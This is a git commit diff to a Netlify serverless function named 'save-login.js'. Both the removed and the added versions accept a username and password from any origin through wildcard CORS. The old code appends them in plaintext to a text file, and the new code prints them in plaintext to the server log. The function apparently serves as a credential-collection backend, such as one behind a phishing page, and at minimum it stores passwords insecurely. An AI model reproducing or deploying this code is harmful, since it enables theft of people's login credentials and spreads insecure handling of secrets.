7ab7f385e34c62ae42a5318fe58111b3e2ee9914
Mohsen <qw546605@gmail.com>
2025-11-01 23:10:24 +0330

    Initial commit 8

--- netlify/functions/save-login.js
+++ netlify/functions/save-login.js
@@ -1,34 +1,28 @@
-const fs = require('fs');
-const path = require('path');
-
 exports.handler = async (event) => {
-  try {
-    const data = JSON.parse(event.body);
-    const { username, password } = data;
-
-    const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
-
-    const filePath = path.join(__dirname, 'logins.txt');
-
-    fs.appendFileSync(filePath, logEntry);
-
-    return {
-      statusCode: 200,
-      body: JSON.stringify({ message: "Login saved to file" }),
-      headers: {
-        "Access-Control-Allow-Origin": "*",
-        "Access-Control-Allow-Headers": "Content-Type",
-      },
-    };
-  } catch (error) {
-    console.error("Error saving login:", error);
-    return {
-      statusCode: 500,
-      body: JSON.stringify({ message: "Failed to save login" }),
-      headers: {
-        "Access-Control-Allow-Origin": "*",
-        "Access-Control-Allow-Headers": "Content-Type",
-      },
-    };
-  }
-};
+    try {
+      const data = JSON.parse(event.body);
+      const { username, password } = data;
+  
+      console.log("Login received:", username, password);
+  
+      return {
+        statusCode: 200,
+        body: JSON.stringify({ message: "Login received" }),
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Headers": "Content-Type",
+        },
+      };
+    } catch (error) {
+      console.error("Error:", error);
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ message: "Internal error" }),
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Headers": "Content-Type",
+        },
+      };
+    }
+  };
+  
